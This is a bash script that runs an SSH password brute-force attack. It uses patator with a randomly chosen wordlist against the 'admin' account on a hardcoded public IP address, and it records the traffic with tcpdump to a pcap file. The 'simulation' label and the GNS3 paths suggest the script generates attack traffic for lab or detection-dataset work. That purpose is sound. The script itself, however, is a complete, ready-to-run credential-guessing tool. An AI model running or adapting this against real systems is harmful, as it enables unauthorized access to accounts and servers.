#!/bin/bash

TARGET="205.174.165.68"
INTERFACE="eth0"
USER="admin"
BRUTE_FOLDER="/home/kali/GNS3/BruteForce"
WORDLIST=$(find "$BRUTE_FOLDER" -type f -name "*.txt" | shuf -n 1)
PCAP_FILE="/home/kali/GNS3/pcap/bruteforce_ssh_$(date +%Y%m%d_%H%M%S).pcap"

if [[ ! -f "$WORDLIST" ]]; then
  echo "Password list not found: $WORDLIST"
  exit 1
fi

echo "Starting tcpdump..."
sudo tcpdump -i "$INTERFACE" dst "$TARGET" and port 22 -w "$PCAP_FILE" &
TCPDUMP_PID=$!

patator ssh_login host="$TARGET" user="$USER" password=FILE0 0="$WORDLIST" -t 5

echo "Stopping tcpdump..."
kill "$TCPDUMP_PID"

echo "SSH brute-force simulation complete. PCAP saved to $PCAP_FILE"
